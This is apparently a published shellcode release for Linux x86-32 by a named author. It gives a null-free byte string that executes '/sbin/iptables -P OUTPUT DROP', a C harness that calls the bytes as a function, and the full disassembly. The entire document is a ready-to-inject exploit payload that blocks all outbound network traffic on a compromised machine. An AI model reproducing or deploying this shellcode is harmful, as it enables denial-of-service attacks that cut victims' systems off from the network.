Name = John Babio
Twitter = 3vi1john
Arch = Linux/x86-32 bits

Code ///sbin/iptables -POUTPUT DROP(Policy of drop to OUTPUT chain)

const char sc[] =
"\x31\xc0\x31\xd2\x50\x68\x44\x52\x4f\x50\x89\xe7\x50\x68\x54\x50\x55\x54\x68\x2d"
"\x50\x4f\x55\x89\xe1\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e"
"\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x57\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
main(){
      int (*shell)();
      shell=sc;
      shell();
    }

08048060 <_start>:
 8048060:    31 c0                    xor    %eax,%eax
 8048062:    31 d2                    xor    %edx,%edx
 8048064:    50                       push   %eax
 8048065:    68 44 52 4f 50           push   $0x504f5244
 804806a:    89 e7                    mov    %esp,%edi
 804806c:    50                       push   %eax
 804806d:    68 54 50 55 54           push   $0x54555054
 8048072:    68 2d 50 4f 55           push   $0x554f502d
 8048077:    89 e1                    mov    %esp,%ecx
 8048079:    50                       push   %eax
 804807a:    68 62 6c 65 73           push   $0x73656c62
 804807f:    68 69 70 74 61           push   $0x61747069
 8048084:    68 62 69 6e 2f           push   $0x2f6e6962
 8048089:    68 2f 2f 2f 73           push   $0x732f2f2f
 804808e:    89 e3                    mov    %esp,%ebx
 8048090:    50                       push   %eax
 8048091:    57                       push   %edi
 8048092:    51                       push   %ecx
 8048093:    53                       push   %ebx
 8048094:    89 e1                    mov    %esp,%ecx
 8048096:    31 d2                    xor    %edx,%edx
 8048098:    b0 0b                    mov    $0xb,%al
 804809a:    cd 80                    int    $0x80